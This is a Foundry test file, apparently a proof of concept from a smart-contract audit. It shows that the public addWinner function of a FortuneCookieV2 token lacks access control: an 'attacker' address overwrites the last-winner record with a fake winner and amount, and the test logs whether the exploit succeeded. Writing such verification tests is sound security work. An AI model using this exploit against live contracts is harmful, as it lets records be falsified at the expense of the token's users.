// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FortuneCookieV2.sol";

contract FortuneCookieAddWinnerTest is Test {
    FortuneCookieV2 token;
    address owner = address(0x1001);
    address attacker = address(0x9999);
    address fakeWinner = address(0x2222);
    uint256 fakeWinAmount = 100 ether;

    function setUp() public {
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address mockFactory = address(0x111);
        address mockWETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address mockPair = address(0x222);

        // Mock router calls
        vm.mockCall(
            routerAddress, 
            abi.encodeWithSignature("factory()"), 
            abi.encode(mockFactory)
        );
        vm.mockCall(
            routerAddress, 
            abi.encodeWithSignature("WETH()"), 
            abi.encode(mockWETH)
        );
        
        // Mock factory createPair
        vm.mockCall(
            mockFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(mockPair)
        );

        // Deploy token
        vm.startPrank(owner);
        token = new FortuneCookieV2();
        vm.stopPrank();
    }

    function test_addWinnerPublicAccess() public {
        // Capture state before attack
        console.log("--- BEFORE-Trigger getLastWinner ---");
        (address lastWinnerBefore, uint256 lastWonBefore) = token.getLastWinner();
        console.log("Before attacker action - Last Winner: %s, Won Amount: %s", lastWinnerBefore, lastWonBefore);
        
        // Attack action
        console.log("--- Trigger addWinner ---");
        vm.prank(attacker);
        token.addWinner(fakeWinner, fakeWinAmount);
        
        // Capture state after attack
        console.log("--- AFTER-Trigger getLastWinner ---");
        (address lastWinnerAfter, uint256 lastWonAfter) = token.getLastWinner();
        console.log("After attacker action - Last Winner: %s, Won Amount: %s", lastWinnerAfter, lastWonAfter);
        
        // Differential verification
        bool recordChanged = (lastWinnerAfter == fakeWinner && lastWonAfter == fakeWinAmount);
        if (recordChanged) {
            console.log("Differential Check: WINNER RECORD CHANGED (Vulnerability Exploited)");
            console.log("Vulnerability Exists: Attacker successfully manipulated last winner record");
        } else {
            console.log("Differential Check: WINNER RECORD UNCHANGED (Vulnerability Not Exploited)");
            console.log("Vulnerability not Exist: Attacker failed to modify last winner record");
        }
    }
}